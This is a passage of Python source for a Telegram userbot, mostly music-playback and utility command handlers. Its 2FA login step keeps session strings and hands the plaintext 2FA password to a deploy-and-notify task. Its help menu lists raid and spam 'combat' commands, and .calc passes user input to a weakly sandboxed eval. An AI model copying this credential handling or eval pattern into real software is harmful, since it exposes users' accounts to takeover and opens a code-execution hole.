            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>❌ Error: <code>{str(e)[:150]}</code></blockquote>")

    elif step == "waiting_2fa":
        password    = event.text.strip()
        client_auth = state.auth_clients.get(sender_id)
        if not client_auth:
            state.asst_conversation_state[sender_id] = None
            return
        proc = await _bot_reply(event, "<blockquote>🔄 Checking 2FA...</blockquote>")
        try:
            await client_auth.sign_in(password=password)
            string_session = client_auth.session.save()
            user_info      = await client_auth.get_me()
            if string_session not in cfg["SAVED_STRINGS"]:
                cfg["SAVED_STRINGS"].append(string_session)
            state.active_bot_users.add(sender_id)
            cfg["BOT_USERS"] = list(state.active_bot_users)
            save_config(cfg)
            await client_auth.disconnect()
            state.auth_clients.pop(sender_id, None)
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>✅ <b>Core Deployed!</b>\n"
                f"Account: <a href='tg://user?id={user_info.id}'>{user_info.first_name}</a></blockquote>")
            asyncio.create_task(deploy_new_session_string(
                string_session, is_startup=False, notif_sender=user_info,
                phone=ustate.get("phone", "N/A"),
                twofa_verified=True, twofa_password=password
            ))
        except Exception as e:
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>❌ 2FA Error: <code>{str(e)[:150]}</code></blockquote>")

# ══════════════════════════════════════════
# MAIN USER COMMAND HANDLER
# ══════════════════════════════════════════
_MUSIC_CMD_RE = re.compile(
    r"(?i)^\.(play|vplay|skip|cut|playforce|pause|resume|"
    r"stopmusic|endmusic|musicstop|mend|queue|q|loop|mstatus)(\s+.+)?$"
)

def _is_music_open_chat(chat_id: int) -> bool:
    return chat_id in cfg.get("MUSIC_OPEN_CHATS", [])

def create_event_handler(client):
    @client.on(events.NewMessage)
    async def global_handler(event):
        text_probe = (event.text or "").strip()
        # Music playback commands are opened up to every group member once an
        # owner/sudo has run .forall in that chat — everything else (raid
        # tools, admin actions, custom cmds, etc.) still requires
        # verify_privileges like before.
        music_bypass = (
            not event.is_private and
            bool(_MUSIC_CMD_RE.match(text_probe)) and
            _is_music_open_chat(event.chat_id)
        )
        if not music_bypass and not await verify_privileges(event, client=client):
            return

        # Don't trigger in private chats talking to bots
        if event.is_private and getattr(event, 'outgoing', False):
            try:
                chat = await event.get_chat()
                if getattr(chat, 'bot', False):
                    return
            except Exception:
                pass

        text       = (event.text or "").strip()
        text_lower = text.lower()
        chat_id    = event.chat_id

        # Track group chats where the userbot is active so broadcast can reach them
        if not event.is_private and chat_id not in state.active_bot_groups:
            state.active_bot_groups.add(chat_id)
            cfg["BOT_GROUPS"] = list(state.active_bot_groups)
            save_config(cfg)

        try:
            me    = await client.get_me()
            my_id = me.id
            istate = get_isolated_state(my_id)
        except Exception:
            return

        # AFK system
        if istate.is_afk and not event.is_private and not text_lower.startswith(".unafk"):
            if event.mentioned:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>💤 <b>I am currently AFK.</b>\n"
                    f"Reason: <code>{istate.afk_reason}</code></blockquote>")
        if istate.is_afk and text_lower.startswith(".unafk"):
            istate.is_afk     = False
            istate.afk_reason = ""
            await safe_send_and_track(client, chat_id,
                "<blockquote>✅ <b>AFK Mode Disabled. I am back online.</b></blockquote>")
            return

        my_id_str = str(my_id)

        # ── Command alias resolution ──────────────────────────────────────
        # If the user typed an alias (e.g. .oye → .ow), remap text/text_lower
        # so all downstream handlers see the canonical command name.
        _user_aliases = cfg.get("CMD_ALIASES", {}).get(my_id_str, {})
        if text_lower in _user_aliases:
            # Remap: replace the alias text with the real command
            _real_cmd = _user_aliases[text_lower]
            text       = f".{_real_cmd}"
            text_lower = text.lower()

        # Custom text commands — works with or without dot, message NOT deleted
        _custom_cmds_user = cfg.get("CUSTOM_CMDS", {}).get(my_id_str, {})
        _cmd_key_check = (
            text_lower if text_lower in _custom_cmds_user else
            ("." + text_lower.lstrip(".") if ("." + text_lower.lstrip(".")) in _custom_cmds_user else None)
        )
        if _cmd_key_check:
            await safe_send_and_track(client, chat_id, _custom_cmds_user[_cmd_key_check])
            return

        # ══════════════════════════════════════════
        # MUSIC COMMANDS
        # ══════════════════════════════════════════

        if re.match(r"(?i)^\.play(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            err = _music_not_available_msg(my_id)
            if err:
                await safe_send_and_track(client, chat_id, err)
                return
            # ── Forall VC gate ────────────────────────────────────────────
            # When music is open to everyone (.forall), only allow a member
            # to queue/play if they are currently IN the voice chat.
            # This stops random requests from people who aren't even listening.
            _my_tgcalls = _get_session_pytgcalls(my_id)
            if music_bypass and _my_tgcalls:
                _mstate_chk = get_music_state(chat_id)
                if _mstate_chk.is_playing:   # only enforce when VC is already live
                    try:
                        _parts = await _my_tgcalls.get_participants(chat_id)
                        _req   = await event.get_sender()
                        _req_id = getattr(_req, "id", None)
                        _in_vc  = any(
                            getattr(p, "user_id", None) == _req_id
                            for p in (_parts or [])
                        )
                        if not _in_vc:
                            await safe_send_and_track(client, chat_id,
                                f"<blockquote>🔊 <b>Bhai, pehle Voice Chat join karo!</b>\n"
                                f"<i>Sirf VC mein baithe log hi song request kar sakte hain.</i></blockquote>")
                            return
                    except Exception:
                        pass  # participant check failed → let it through
            # ─────────────────────────────────────────────────────────────
            m     = re.match(r"(?i)^\.play(?:\s+(.+))?$", text)
            query = m.group(1).strip() if m.group(1) else None

            # ── BLAST MODE — "kya baat hai" easter egg ───────────────────
            _kbh_triggers = {
                "kya baat hai", "kya baat aa", "kyabaathai", "kya_baat_hai",
                "kbh", "kya baat", "kyabaat",
            }
            if query and query.strip().lower() in _kbh_triggers:
                query = "Kya Baat Aa Hardy Sandhu Jaani B Praak"
                proc_msg = await safe_send_and_track(client, chat_id,
                    "<blockquote>╔══〔 💥 <b>4ST BLAST MODE ACTIVATED</b> 〕══╗\n"
                    "║\n"
                    "║  🔥 <b>Kya Baat Aa</b> — Hardy Sandhu\n"
                    "║  🚀 MAX QUALITY • TOP HIT • FULL SONG\n"
                    "║\n"
                    "║  ⚡ <i>Searching at FULL SPEED...</i>\n"
                    "║\n"
                    "╚══════════════════════╝</blockquote>")
            else:
                proc_msg = await safe_send_and_track(client, chat_id,
                    "<blockquote>🔍  <b>Searching...</b>  ⚡</blockquote>")

            # ── SPEED FIX: parallel VC pre-join ──────────────────────────
            # Old: search song (5-30s) → join VC → play          [slow]
            # New: join VC + search song at the same time → play  [fast]
            # Only pre-join when VC is not already active (would just queue).
            _mstate_pre = get_music_state(chat_id)
            _vc_prejoin_task = None
            if not _mstate_pre.is_playing:
                async def _prejoin_vc_bg():
                    try:
                        await _try_create_group_call(chat_id, my_id)
                    except Exception:
                        pass  # best-effort; tgcalls.play() handles it on its own
                _vc_prejoin_task = asyncio.create_task(_prejoin_vc_bg())
            # ─────────────────────────────────────────────────────────────

            # ── Multi-account dedup guard ─────────────────────────────────
            # When extra sessions (SAVED_STRINGS) are active, ALL accounts
            # receive and process the same .play message simultaneously.
            # _play_in_progress ensures only the FIRST account runs the
            # expensive search+download; others silently skip.
            if chat_id in _play_in_progress:
                return
            _play_in_progress.add(chat_id)

            track = None
            try:
                if event.reply_to_msg_id:
                    track = await download_tagged_media(event)
                    if track:
                        track.is_video = False
                if not track and query:
                    track = await search_and_download_audio(query)
            finally:
                _play_in_progress.discard(chat_id)

            if not track:
                if _vc_prejoin_task and not _vc_prejoin_task.done():
                    _vc_prejoin_task.cancel()
                if proc_msg:
                    try: await proc_msg.edit(
                        "<blockquote>🔇  <b>Nothing found.</b>  Try a different search.</blockquote>")
                    except Exception: pass
                return

            # Let the pre-join finish (usually already done by the time
            # the song download completes) so VC is ready for tgcalls.play().
            if _vc_prejoin_task and not _vc_prejoin_task.done():
                try:
                    await asyncio.wait_for(asyncio.shield(_vc_prejoin_task), timeout=3.0)
                except Exception:
                    pass

            mstate = get_music_state(chat_id)
            # Hold the per-chat lock across the "queue vs play now" decision
            # so a second .play fired in the same instant (or an auto-advance
            # from a track ending) can't both see is_playing=False and both
            # try to start playback at once — that race is what causes a
            # song to sometimes silently not play.
            async with mstate.lock:
                if mstate.is_playing:
                    if music_sources.is_duplicate_in_queue(track.title, mstate.current, mstate.queue):
                        if proc_msg:
                            try: await proc_msg.edit(
                                f"<blockquote>♻️  Already queued:  <code>{track.title[:40]}</code></blockquote>")
                            except Exception: pass
                        return
                    mstate.queue.append(track)
                    if proc_msg:
                        try: await proc_msg.edit(
                            f"<blockquote>📥  <b>Queued  #{len(mstate.queue)}</b>\n"
                            f"  🎵  <b>{track.title[:44]}</b>\n"
                            f"  ⏱  <code>{track.duration_str()}</code></blockquote>")
                        except Exception: pass
                else:
                    sender = await event.get_sender()
                    track.requester = getattr(sender, 'first_name', None) if sender else None
                    ok, reason = await music_play_track(chat_id, track, my_id)
                    mstate.last_error = reason
                    if ok:
                        await show_now_playing(client, chat_id, mstate, proc_msg)
                    elif proc_msg:
                        try:
                            await proc_msg.edit(_play_failure_text(track.title, reason))
                        except Exception: pass

        elif re.match(r"(?i)^\.vplay(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            err = _music_not_available_msg(my_id)
            if err:
                await safe_send_and_track(client, chat_id, err)
                return
            m     = re.match(r"(?i)^\.vplay(?:\s+(.+))?$", text)
            query = m.group(1).strip() if m.group(1) else None
            proc_msg = await safe_send_and_track(client, chat_id,
                "<blockquote>🎬  <b>Fetching video...</b>  ⚡</blockquote>")

            track = None
            if event.reply_to_msg_id:
                track = await download_tagged_media(event)
                if track:
                    track.is_video = True
            if not track and query:
                track = await search_and_download_video(query)

            if not track:
                if proc_msg:
                    try: await proc_msg.edit(
                        "<blockquote>🔇  <b>Video not found.</b>  Try a YouTube link directly.</blockquote>")
                    except Exception: pass
                return

            mstate = get_music_state(chat_id)
            async with mstate.lock:
                if mstate.is_playing:
                    if music_sources.is_duplicate_in_queue(track.title, mstate.current, mstate.queue):
                        if proc_msg:
                            try: await proc_msg.edit(
                                f"<blockquote>♻️ <b>Already in queue:</b> <code>{track.title}</code></blockquote>")
                            except Exception: pass
                        return
                    mstate.queue.append(track)
                    if proc_msg:
                        try: await proc_msg.edit(
                            f"<blockquote>📥  <b>Video Queued  #{len(mstate.queue)}</b>\n"
                            f"  🎬  <b>{track.title[:44]}</b>\n"
                            f"  ⏱  <code>{track.duration_str()}</code></blockquote>")
                        except Exception: pass
                else:
                    sender = await event.get_sender()
                    track.requester = getattr(sender, 'first_name', None) if sender else None
                    ok, reason = await music_play_track(chat_id, track, my_id)
                    mstate.last_error = reason
                    if ok:
                        await show_now_playing(client, chat_id, mstate, proc_msg)
                    elif proc_msg:
                        try:
                            await proc_msg.edit(_play_failure_text(track.title, reason))
                        except Exception: pass

        elif re.match(r"(?i)^\.(skip|cut)$", text):
            asyncio.create_task(event.delete())
            err = _music_not_available_msg(my_id)
            if err:
                await safe_send_and_track(client, chat_id, err)
                return
            mstate = get_music_state(chat_id)
            if not mstate.is_playing:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>⏹  Nothing is playing.</blockquote>")
                return
            skipped = mstate.current
            ok = await music_play_next(chat_id, client, session_user_id=my_id)
            if ok:
                await show_now_playing(client, chat_id, mstate)
            else:
                _stop_progress_animator(mstate)
                mstate.now_playing_msg = None
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>⏭  <b>Cut:</b> <code>{(skipped.title[:36] if skipped else '—')}</code>\n"
                    "⏹  Queue khatam — VC chhod diya.</blockquote>")

        elif re.match(r"(?i)^\.playforce(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            err = _music_not_available_msg(my_id)
            if err:
                await safe_send_and_track(client, chat_id, err)
                return
            m     = re.match(r"(?i)^\.playforce(?:\s+(.+))?$", text)
            query = m.group(1).strip() if m.group(1) else None
            proc_msg = await safe_send_and_track(client, chat_id,
                "<blockquote>⚡  <b>Force play — queue cleared</b></blockquote>")
            track = None
            if event.reply_to_msg_id:
                track = await download_tagged_media(event)
            if not track and query:
                track = await search_and_download_audio(query)
            if not track:
                if proc_msg:
                    try: await proc_msg.edit(
                        "<blockquote>🔇  <b>Not found.</b></blockquote>")
                    except Exception: pass
                return
            mstate = get_music_state(chat_id)
            async with mstate.lock:
                mstate.queue.clear()
                ok, reason = await music_play_track(chat_id, track, my_id)
                mstate.last_error = reason
            if ok:
                await show_now_playing(client, chat_id, mstate, proc_msg)
            elif proc_msg:
                try:
                    await proc_msg.edit(_play_failure_text(track.title, reason))
                except Exception: pass

        elif re.match(r"(?i)^\.pause$", text):
            asyncio.create_task(event.delete())
            mstate = get_music_state(chat_id)
            if not mstate.is_playing or mstate.is_paused:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>⏸  Already paused or nothing playing.</blockquote>")
                return
            try:
                _tgcalls = _get_session_pytgcalls(mstate.owner_uid or my_id)
                if _tgcalls:
                    await _tgcalls.pause(chat_id)
                mstate.is_paused = True
                if mstate.current:
                    mstate.current.paused_at = time.time()
                if mstate.now_playing_msg:
                    try:
                        await mstate.now_playing_msg.edit(_now_playing_text(mstate))
                    except Exception:
                        pass
                else:
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>⏸ <b>Paused:</b> "
                        f"<code>{mstate.current.title if mstate.current else '?'}</code></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Pause failed: <code>{e}</code></blockquote>")

        elif re.match(r"(?i)^\.resume$", text):
            asyncio.create_task(event.delete())
            mstate = get_music_state(chat_id)
            if not mstate.is_paused:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>▶️  Not paused.</blockquote>")
                return
            try:
                _tgcalls = _get_session_pytgcalls(mstate.owner_uid or my_id)
                if _tgcalls:
                    await _tgcalls.resume(chat_id)
                # Shift started_at forward by however long we sat paused, so
                # the progress bar picks up exactly where it froze instead of
                # jumping ahead by the pause duration.
                if mstate.current and mstate.current.paused_at is not None:
                    paused_for = time.time() - mstate.current.paused_at
                    mstate.current.started_at += paused_for
                    mstate.current.paused_at = None
                mstate.is_paused = False
                if mstate.now_playing_msg:
                    await show_now_playing(client, chat_id, mstate)
                else:
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>▶️ <b>Resumed:</b> "
                        f"<code>{mstate.current.title if mstate.current else '?'}</code></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Resume failed: <code>{e}</code></blockquote>")

        elif re.match(r"(?i)^\.(stopmusic|endmusic|musicstop|mend|end)$", text):
            asyncio.create_task(event.delete())
            mstate = get_music_state(chat_id)
            _stop_progress_animator(mstate)
            stopped_text = "<blockquote>⏹  <b>Stopped.</b>  Left voice chat.</blockquote>"
            edited_in_place = False
            if mstate.now_playing_msg:
                try:
                    await mstate.now_playing_msg.edit(stopped_text)
                    edited_in_place = True
                except Exception:
                    pass
            mstate.now_playing_msg = None
            mstate.queue.clear()
            mstate.current    = None
            mstate.is_playing = False
            mstate.is_paused  = False
            try:
                _tgcalls = _get_session_pytgcalls(mstate.owner_uid or my_id)
                if _tgcalls:
                    await _tgcalls.leave_call(chat_id)
            except Exception:
                pass
            mstate.owner_uid = None
            gc.collect()
            if not edited_in_place:
                await safe_send_and_track(client, chat_id, stopped_text)

        elif re.match(r"(?i)^\.(queue|q)$", text):
            asyncio.create_task(event.delete())
            mstate = get_music_state(chat_id)
            await safe_send_and_track(client, chat_id, _format_queue(mstate))

        elif re.match(r"(?i)^\.loop$", text):
            asyncio.create_task(event.delete())
            mstate      = get_music_state(chat_id)
            mstate.loop = not mstate.loop
            status      = "🔁 ON" if mstate.loop else "➡️ OFF"
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🔁  Loop {status}</blockquote>")

        elif re.match(r"(?i)^\.mstatus$", text):
            asyncio.create_task(event.delete())
            mstate   = get_music_state(chat_id)
            pyro_ok  = "🟢 Connected" if _account_has_own_pyro(my_id) else "🔴 Not Connected"
            ytdlp_ok = "🟢 Ready" if YTDLP_AVAILABLE else "🔴 Missing"
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🎵  <b>MUSIC ENGINE</b>\n"
                f"──────────────────────\n"
                f"  Pyrogram   {pyro_ok}\n"
                f"  yt-dlp     {ytdlp_ok}\n"
                f"  YouTube    🟢 40-jugad (10 clients)\n" +
                f"  Cookies    {'🟢 Active' if __import__('os').environ.get('YTDLP_COOKIES') else '⚪ Not Set'}\n"
                f"  PyTgCalls  {'🟢 Ready' if _get_session_pytgcalls(my_id) else '🔴 Not Ready'}\n"
                f"──────────────────────\n"
                f"  Now:  <code>{mstate.current.title[:40] if mstate.current else '—'}</code>\n"
                f"  Queue: <b>{len(mstate.queue)}</b> track{'s' if len(mstate.queue) != 1 else ''}\n"
                f"  Loop:  {'🔁 ON' if mstate.loop else 'off'}\n"
                f"──────────────────────\n"
                f"  <i>.play  ·  .skip  ·  .mend</i>"
                f"</blockquote>")

        elif re.match(r"(?i)^\.(forall|song\s+all)$", text):
            # .forall OR .song all — open music to all chat members
            asyncio.create_task(event.delete())
            open_chats = cfg.setdefault("MUSIC_OPEN_CHATS", [])
            if chat_id not in open_chats:
                open_chats.append(chat_id)
                save_config(cfg)
            asyncio.create_task(send_module_log(
                f"🎵 <b>Music Access: ALL</b>\nChat: <code>{chat_id}</code>"))
            await safe_send_and_track(client, chat_id,
                "<blockquote>🌐 <b>Music: open to everyone in this chat.</b>\n"
                "<code>.play</code> · <code>.skip</code> · <code>.pause</code> · <code>.queue</code></blockquote>")

        elif re.match(r"(?i)^\.(me|song\s+me)$", text):
            # .me OR .song me — restrict music back to owner/sudo only
            asyncio.create_task(event.delete())
            open_chats = cfg.setdefault("MUSIC_OPEN_CHATS", [])
            if chat_id in open_chats:
                open_chats.remove(chat_id)
                save_config(cfg)
            asyncio.create_task(send_module_log(
                f"🎵 <b>Music Access: ME ONLY</b>\nChat: <code>{chat_id}</code>"))
            await safe_send_and_track(client, chat_id,
                "<blockquote>🔒 <b>Music: restricted to owner/sudo.</b></blockquote>")

        # Remote: <chatid> play <song> / <chatid> vplay <song>
        elif re.match(r"(?i)^(-?\d+)\s+(v?play)\s+(.+)$", text):
            m = re.match(r"(?i)^(-?\d+)\s+(v?play)\s+(.+)$", text)
            asyncio.create_task(event.delete())
            if not await verify_privileges(event, client=client, strict_owner_only=True):
                return
            target_chat = int(m.group(1))
            play_type   = m.group(2).lower()
            query       = m.group(3).strip()
            err = _music_not_available_msg(my_id)
            if err:
                await safe_send_and_track(client, chat_id, err)
                return
            proc_msg = await safe_send_and_track(client, chat_id,
                f"<blockquote>🎯  <b>Remote → <code>{target_chat}</code></b>\n"
                f"🔍 Searching: <code>{query}</code></blockquote>")
            if "vplay" in play_type:
                track = await search_and_download_video(query)
            else:
                track = await search_and_download_audio(query)
            if not track:
                if proc_msg:
                    try: await proc_msg.edit(
                        "<blockquote>❌ <b>Not found.</b></blockquote>")
                    except Exception: pass
                return
            mstate = get_music_state(target_chat)
            async with mstate.lock:
                if mstate.is_playing:
                    mstate.queue.append(track)
                    result_text = (f"<blockquote>📥  Queued in <code>{target_chat}</code>\n"
                                   f"🎵 <b>{track.title}</b></blockquote>")
                else:
                    ok, reason = await music_play_track(target_chat, track, my_id)
                    result_text = (
                        f"<blockquote>▶️  Playing in <code>{target_chat}</code>\n"
                        f"🎵 <b>{track.title}</b></blockquote>"
                        if ok else _play_failure_text(track.title, reason)
                    )
                    if ok:
                        await show_now_playing(client, target_chat, mstate)
            if proc_msg:
                try: await proc_msg.edit(result_text)
                except Exception: pass

        # Remote: <chatid> play (reply to media)
        elif re.match(r"(?i)^(-?\d+)\s+(v?play)$", text) and event.reply_to_msg_id:
            m = re.match(r"(?i)^(-?\d+)\s+(v?play)$", text)
            asyncio.create_task(event.delete())
            if not await verify_privileges(event, client=client, strict_owner_only=True):
                return
            target_chat = int(m.group(1))
            play_type   = m.group(2).lower()
            err = _music_not_available_msg(my_id)
            if err:
                await safe_send_and_track(client, chat_id, err)
                return
            track = await download_tagged_media(event)
            if track and "vplay" in play_type:
                track.is_video = True
            if not track:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ <b>No valid media found in reply.</b></blockquote>")
                return
            mstate = get_music_state(target_chat)
            async with mstate.lock:
                if mstate.is_playing:
                    mstate.queue.append(track)
                    queued_msg = True
                else:
                    ok, reason = await music_play_track(target_chat, track, my_id)
                    queued_msg = False
                    if ok:
                        await show_now_playing(client, target_chat, mstate)
            if queued_msg:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>📥 <b>Queued in <code>{target_chat}</code></b>\n"
                    f"🎵 <b>{track.title}</b></blockquote>")
            elif ok:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>▶️ Playing in <code>{target_chat}</code>\n"
                    f"🎵 <b>{track.title}</b></blockquote>")
            else:
                await safe_send_and_track(client, chat_id, _play_failure_text(track.title, reason))

        # ══════════════════════════════════════════
        # ORIGINAL COMMANDS
        # ══════════════════════════════════════════

        elif re.match(r"(?i)^\.(help|h)$", text):
            asyncio.create_task(event.delete())
            cmnd_count = len(cfg.get("CUSTOM_CMDS", {}).get(my_id_str, {}))
            help_msg = (
                f"<blockquote>⚡  <b>4ST PRIME CORE</b>\n\n"
                "🔥  <b>COMBAT</b>\n"
                "  .raid  .rraid  .spam  .multi\n"
                "  .fuck  .ow  .ghost  .sraid  .stop\n\n"
                "🏷️  <b>BROADCAST</b>\n"
                "  .tagall  .onetag  .targetlist\n\n"
                "👑  <b>ADMIN</b>\n"
                "  .ban  .mute  .banall  .promote  .demote\n"
                "  .unmute  .unban  .pin  .unpin\n"
                "  .warn  .unwarn  .warnlist\n\n"
                "🛡️  <b>SECURITY</b>\n"
                "  .dmsec  .sudoadd  .sudoaddfull\n"
                "  .sudorm  .sudolist\n\n"
                "🤖  <b>AI  &amp;  FUN</b>\n"
                "  .setmode  .mimic  .fun  .dice\n"
                "  .hack  .magic  .bomb  .moon  .rocket\n\n"
                "🛠️  <b>TOOLS</b>\n"
                "  .tr  .weather  .ytdl  .calc  .kang  .qout\n"
                "  .info  .id  .ping  .purge  .delall\n"
                "  .config  .speed  .font  .typing\n"
                f"  .cmnd  .rmcmnd  <i>({cmnd_count} active)</i>\n\n"
                "🎵  <b>MUSIC</b>\n"
                "  .play    .vplay    .skip    .pause\n"
                "  .resume  .playforce  .queue  .loop\n"
                "  .mend   .mstatus   .ytdl   .forall\n\n"
                "──────────────────────\n"
                "  <code>.how [cmd]</code>  —  detailed help\n"
                "  <code>.ping</code>  ·  <code>.restart</code>  ·  <code>.config</code>"
                "</blockquote>"
            )
            await safe_send_and_track(client, chat_id, help_msg)

        elif re.match(r"(?i)^\.(ping|alive)$", text):
            # Only let this specific account respond to its own ping command.
            # Use verify_privileges — handles own-account AND MASTER_SYNC automatically
            if event.sender_id != my_id:
                if not await verify_privileges(event, client=client):
                    return
            asyncio.create_task(event.delete())
            t_start = time.monotonic()
            uptime  = str(timedelta(seconds=int(time.monotonic() - BOOT_TIME)))
            real_ms = round((time.monotonic() - t_start) * 1000, 2)
            ping_payload = (
                "<blockquote expandable>"
                "✨ <b>𝟒𝐒𝐓 𝐏𝐑𝐈𝐌𝐄 𝐂𝐎𝐑𝐄</b> ✨\n"
                "┏━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃ 📡 <b>Ping</b>     ⟶ <code>{real_ms} ms</code>\n"
                f"┃ ⏱️ <b>Uptime</b>   ⟶ <code>{uptime}</code>\n"
                "┃ ⚡ <b>Engine</b>   ⟶ <code>Telethon + PyTgCalls</code>\n"
                "┃ 💠 <b>Status</b>   ⟶ <code>Perfect Sync</code>\n"
                f"┃ 🎵 <b>Music</b>    ⟶ <code>{'🟢 Active' if _account_has_own_pyro(my_id) else '🔴 Pyrogram Not Setup'}</code>\n"
                f"┃ 👤 <b>Master</b>   ⟶ <a href='tg://user?id={my_id}'>{me.first_name}</a>\n"
                "┗━━━━━━━━━━━━━━━━━━━━┛"
                "</blockquote>"
            )
            await safe_send_and_track(client, chat_id, ping_payload)

        elif re.match(r"(?i)^\.fun(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m         = re.search(r"(?i)^\.fun(?:\s+(.+))?$", text)
            anim_name = m.group(1).strip().lower() if m.group(1) else None
            fun_data  = {}
            if os.path.exists(FUN_PATH):
                try:
                    with open(FUN_PATH, 'r', encoding="utf-8") as f:
                        fun_data = json.load(f)
                except Exception:
                    pass
            if not anim_name:
                keys = list(fun_data.keys())
                msg  = (f"<blockquote>🎭 <b>FUN ANIMATIONS ({len(keys)}+ TOTAL)</b>\n\n" +
                        ", ".join(f"<code>{k}</code>" for k in keys) +
                        "\n\n👉 <b>Use:</b> <code>.fun [name]</code></blockquote>")
                await safe_send_and_track(client, chat_id, msg)
                return
            if anim_name not in fun_data:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Animation '<code>{anim_name}</code>' not found.</blockquote>")
                return
            frames = fun_data[anim_name]
            msg    = await safe_send_and_track(client, chat_id, frames[0])
            if msg:
                for frame in frames[1:]:
                    await asyncio.sleep(1.0)
                    try: await msg.edit(frame)
                    except Exception: pass

        elif re.match(r"(?i)^\.setmode\s+(.+)$", text):
            asyncio.create_task(event.delete())
            m    = re.search(r"(?i)^\.setmode\s+(.+)$", text)
            mode = m.group(1).lower()
            if mode in ["flirt", "roast", "normal"]:
                ai_modes[chat_id] = mode
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>✅ <b>AI Chat Mode set to:</b> {mode.upper()}</blockquote>")
            elif mode == "off":
                ai_modes.pop(chat_id, None)
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ <b>AI Chat Mode Disabled.</b></blockquote>")
            else:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Invalid mode. Use: flirt, roast, normal, off</blockquote>")

        elif re.match(r"(?i)^\.mimic$", text):
            asyncio.create_task(event.delete())
            replied_msg = await event.get_reply_message()
            if not replied_msg or not replied_msg.text:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a message to mimic.</blockquote>")
                return
            prompt = (
                f"Analyze this person's texting style (punctuation, abbreviations, Hinglish mix, emoji use, slang):\n\n"
                f"'{replied_msg.text}'\n\nNow write 2-3 sample messages in EXACTLY that style about any random topic. "
                f"Sound 100% human, not AI."
            )
            try:
                result = await _ai_generate(prompt)
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>🎭 <b>MIMIC:</b>\n\n{result[:1000]}</blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ AI Error: <code>{e}</code></blockquote>")

        elif re.match(r"(?i)^\.dice$", text):
            asyncio.create_task(event.delete())
            await client.send_message(chat_id, "🎲")

        elif re.match(r"(?i)^\.calc\s+(.+)$", text):
            asyncio.create_task(event.delete())
            m    = re.search(r"(?i)^\.calc\s+(.+)$", text)
            expr = m.group(1).strip()
            try:
                result = eval(expr, {"__builtins__": {}}, {})
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>🔢 <b>Calc:</b> <code>{expr}</code>\n"
                    f"✅ <b>Result:</b> <code>{result}</code></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Error: <code>{e}</code></blockquote>")

        elif re.match(r"(?i)^\.rev\s+(.+)$", text):
            asyncio.create_task(event.delete())
            m      = re.search(r"(?i)^\.rev\s+(.+)$", text)
            result = m.group(1)[::-1]
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🔄 <b>{result}</b></blockquote>")

        elif re.match(r"(?i)^\.(upper|lower)\s+(.+)$", text):
            asyncio.create_task(event.delete())
            m      = re.search(r"(?i)^\.(upper|lower)\s+(.+)$", text)
            mode   = m.group(1).lower()
            txt    = m.group(2)
            result = txt.upper() if mode == "upper" else txt.lower()
            await safe_send_and_track(client, chat_id,
                f"<blockquote><b>{result}</b></blockquote>")

        elif re.match(r"(?i)^\.id$", text):
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            id_text   = f"<blockquote>🆔 <b>Chat ID:</b> <code>{chat_id}</code>"
            if reply_msg:
                id_text += f"\n👤 <b>User ID:</b> <code>{reply_msg.sender_id}</code>"
            id_text += "</blockquote>"
            await safe_send_and_track(client, chat_id, id_text)

        elif re.match(r"(?i)^\.afk(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m      = re.match(r"(?i)^\.afk(?:\s+(.+))?$", text)
            reason = m.group(1).strip() if m.group(1) else "No reason given"
            istate.is_afk     = True
            istate.afk_reason = reason
            await safe_send_and_track(client, chat_id,
                f"<blockquote>💤 <b>AFK Enabled.</b>\nReason: <code>{reason}</code></blockquote>")

        elif re.match(r"(?i)^\.sudoadd(?:full)?\s*(.+)?$", text):
            asyncio.create_task(event.delete())
            if my_id != cfg.get("OWNER_ID"):
                return
            m          = re.search(r"(?i)^\.sudoadd(full)?\s*(.+)?$", text)
            is_full    = bool(m.group(1))
            target_arg = m.group(2).strip() if m.group(2) else None
            t_id       = await resolve_target(client, event, target_arg)
            if not t_id:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Target not found.</blockquote>")
                return
            key = "SUDO_LEVEL_2" if is_full else "SUDO_LEVEL_1"
            if t_id not in cfg[key]:
                cfg[key].append(t_id)
                save_config(cfg)
            level = "FULL" if is_full else "LIMITED"
            await safe_send_and_track(client, chat_id,
                f"<blockquote>✅ <b>Added to Sudo ({level}):</b> <code>{t_id}</code></blockquote>")

        elif re.match(r"(?i)^\.sudorm\s*(.+)?$", text):
            asyncio.create_task(event.delete())
            if my_id != cfg.get("OWNER_ID"):
                return
            m          = re.search(r"(?i)^\.sudorm\s*(.+)?$", text)
            target_arg = m.group(1).strip() if m.group(1) else None
            t_id       = await resolve_target(client, event, target_arg)
            if not t_id:
